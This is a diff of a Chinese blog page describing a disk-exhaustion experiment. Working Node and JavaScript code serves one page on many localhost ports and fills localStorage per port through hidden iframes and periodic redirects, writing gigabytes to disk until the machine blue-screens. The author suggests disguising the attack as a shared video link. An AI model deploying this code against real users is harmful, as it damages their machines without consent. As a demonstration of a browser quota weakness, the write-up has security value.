@@ -337,9 +337,7 @@
 	<div class="article-content" id="article-content">
 		<p>有人说，前端的界限就在浏览器那儿。</p>
 <p>无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。<br>这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。<br>然而，作为一个前端，我发现是有方式打开次元大门的…</p>
-<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些<strong>安全问题</strong>。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，<strong>点开一个链接，电脑突然就蓝屏了</strong>！想想还真有点小激动。</p>
-<a id="more"></a>
-
+<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些<strong>安全问题</strong>。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，<strong>点开一个链接，电脑突然就蓝屏了</strong>！想想还真有点小激动。<br><a id="more"></a></p>
 <h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>故事得从localStorage说起。</p>
 <p>html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。<br>windows下的chrome，localStorage存储于<code>C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Local Storage</code>文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。</p>
 <p>对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。</p>
@@ -347,27 +345,22 @@
 <h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>关键的问题在于，这一限制，针对的是一个<code>域名+端口</code>。<br>也就是说，你访问<code>同一个域名的不同端口</code>，它们的localStorage并无关联，是分开存储的。</p>
 <p>我用node简单地开启了服务器，这时，用户访问<code>http://127.0.0.1:1000</code>到<code>http://127.0.0.1:1099</code>这100个端口，会请求到同一个页面：<code>index.html</code>：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line">var fs = require(&apos;fs&apos;);</span><br><span class="line"></span><br><span class="line">//100个端口</span><br><span class="line">for(var port = 1000; port&lt; 1100; port++)&#123;</span><br><span class="line">  http.createServer(function (request, response) &#123;</span><br><span class="line">    //请忽略这种循环读文件的方式，只为了简便</span><br><span class="line">    fs.readFile(&apos;./index.html&apos;, function(err, content)&#123;</span><br><span class="line">      if(err) &#123;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        response.writeHead(200, &#123; &apos;Content-Type&apos; : &apos;text/html; charset=UTF-8&apos; &#125;);</span><br><span class="line">        response.write(content);</span><br><span class="line">        response.end();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;).listen(port, &apos;127.0.0.1&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>当然，这个index.html里涉及了localStorage写操作。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var s = &quot;&quot;;</span><br><span class="line">//慢慢来，别写太大了，好害怕…</span><br><span class="line">for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</span><br><span class="line">  s += &quot;0&quot;;</span><br><span class="line">&#125;</span><br><span class="line">localStorage.setItem(&quot;testData&quot;, s);</span><br></pre></td></tr></table></figure>
-
 <p>我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。</p>
 <h3 id="自动遍历"><a href="#自动遍历" class="headerlink" title="自动遍历"></a>自动遍历</h3><p>但这种程度还不够。<br>如果要实验变得更好（xie）玩（e）一些，问题就变成如何<code>让用户自动遍历这些端口</code>？</p>
 <p>iframe是个好的尝试。<br>只要一打开<code>http://127.0.0.1: 1000</code>，页面的脚步就会创建一个iframe，去请求<code>http://127.0.0.1: 1001</code>，一直循环下去。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var Main = (function()&#123;</span><br><span class="line">  var _key = &quot;testData&quot;;</span><br><span class="line">  var _max = 1100; //最大限制</span><br><span class="line">  return &#123;</span><br><span class="line">    init: function()&#123;</span><br><span class="line">      //慢慢来，别写太大了，好害怕…</span><br><span class="line">      var s = &quot;&quot;;</span><br><span class="line">      for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</span><br><span class="line">        s += &quot;0&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      localStorage.setItem(_key, s);</span><br><span class="line"></span><br><span class="line">      var port = parseInt(location.port)+1;</span><br><span class="line">      if(port &gt; _max) return;</span><br><span class="line"></span><br><span class="line">      //新添加iframe</span><br><span class="line">      var url = &quot;http://127.0.0.1:&quot; + port;</span><br><span class="line">      var $iframe = document.createElement(&quot;iframe&quot;);</span><br><span class="line">      $iframe.src = url;</span><br><span class="line">      document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-
 <p>当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…<br>比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。</p>
-<p>然后我就看到请求如潮水渐涨：<br><img src="/assets/blogImg/localstorage1.png" alt></p>
+<p>然后我就看到请求如潮水渐涨：<br><img src="/.com//blogImg/localstorage1.png" alt></p>
 <p>但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。</p>
-<p>###防止浏览器崩溃</p>
-<p>C盘还未撑满，同志还需努力。怎么办？</p>
+<h3 id="防止浏览器崩溃"><a href="#防止浏览器崩溃" class="headerlink" title="防止浏览器崩溃"></a>防止浏览器崩溃</h3><p>C盘还未撑满，同志还需努力。怎么办？</p>
 <p>突然想到，到达iframe极限之前，我们可以重定向啊。<br>每访问50个端口，就使用<code>window.location.href</code>重定向一次，去确保浏览器不崩溃。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">var Main = (function()&#123;</span><br><span class="line">  var _key = &quot;testData&quot;;</span><br><span class="line">  var _max = 1200; //最大限制</span><br><span class="line">  var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转</span><br><span class="line"></span><br><span class="line">  return &#123;</span><br><span class="line">    init: function()&#123;</span><br><span class="line">      //慢慢来，别写太大了，好害怕…</span><br><span class="line">      var s = &quot;&quot;;</span><br><span class="line">      for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</span><br><span class="line">        s += &quot;0&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      localStorage.setItem(_key, s);</span><br><span class="line"></span><br><span class="line">      var port = parseInt(location.port)+1;</span><br><span class="line">      if(port &gt; _max) return;</span><br><span class="line"></span><br><span class="line">      if(port % _jumpSpace == 0)&#123;</span><br><span class="line">        //每50个，重定向一次</span><br><span class="line">        window.location.href = url;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">        //新添加iframe</span><br><span class="line">        var $iframe = document.createElement(&quot;iframe&quot;);</span><br><span class="line">        $iframe.src = url;</span><br><span class="line">        document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-
 <p>事实证明，这种蛮拼的方法的确可行。</p>
-<p>至此，只要访问<code>http://127.0.0.1: 1000</code>，就会往Local Storage文件夹里写入近500M无用数据：<br><img src="/assets/blogImg/localstorage3.png" alt></p>
-<p>里面的数据是这样的：<br><img src="/assets/blogImg/localstorage2.png" alt></p>
-<h3 id="继续实验的黑科技"><a href="#继续实验的黑科技" class="headerlink" title="继续实验的黑科技"></a>继续实验的黑科技</h3><p>算了下我的C盘还有空间嘛，那就把端口数量从100增长到200个。<br>结果是这样的，到达了1.17G大小。<br><img src="/assets/blogImg/localstorage4.png" alt></p>
+<p>至此，只要访问<code>http://127.0.0.1: 1000</code>，就会往Local Storage文件夹里写入近500M无用数据：<br><img src="/.com//blogImg/localstorage3.png" alt></p>
+<p>里面的数据是这样的：<br><img src="/.com//blogImg/localstorage2.png" alt></p>
+<h3 id="继续实验的黑科技"><a href="#继续实验的黑科技" class="headerlink" title="继续实验的黑科技"></a>继续实验的黑科技</h3><p>算了下我的C盘还有空间嘛，那就把端口数量从100增长到200个。<br>结果是这样的，到达了1.17G大小。<br><img src="/.com//blogImg/localstorage4.png" alt></p>
 <p>在后续的实验中，我就慢慢的把端口数量与存储的数据调大。</p>
 <p>电脑也运行得越来越慢。这是为什么呢？</p>
 <p>我观察到，有时候执行<code>localStorage.setItem()</code>后，在文件夹里不一定立即能看到数据文件。<br>怀疑这些数据会被chrome先放到内存里，以避免重复读写带来的消耗，在空闲或关闭的时机，再写进硬盘里。</p>
@@ -381,7 +374,7 @@
 <p>可以说，浏览器的内心几乎是崩溃的。</p>
 <h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>最后，还是得用严肃脸告诫一下：害人之心不可无。<br>本实验，从一开始就是怀揣着将<code>安全问题上交给国家的初衷</code>去做的（是的就是这么纯粹）。</p>
 <p>后续，看着C盘还有2G空间，我又把端口增长到2000个，试下会发生什么。<br>由于请求过多，需要一定时间，我就去做别的事情了。<br>回来后发现房间安静祥和，美轮美奂，一片蓝光，像是加了特技。</p>
-<p><img src="/assets/blogImg/localstorage5.png" alt></p>
+<p><img src="/.com//blogImg/localstorage5.png" alt></p>
 <p>那么问题来了，计算机修理哪家强？<br>有点急…</p>
 	
 	</div>
@@ -461,11 +454,10 @@
 								八月 1日, 2014				
 							</p>
 							<p class="relate-post-content">
-								#Kael-Qrcode 
-
+								Kael-Qrcode
 基于html5 canvas，灵活轻巧，美观多变的二维码生成库                   
 
-一直觉得二维码长得太单一，抽空做了一个生成库：github here。取名卡尔，缘由dota英雄Ka...
+一直觉得二维码长得太单一，抽空做了一个生成库：github here。取名卡尔，缘由dota英雄Kael；...
 							</p>
 						</div>
 
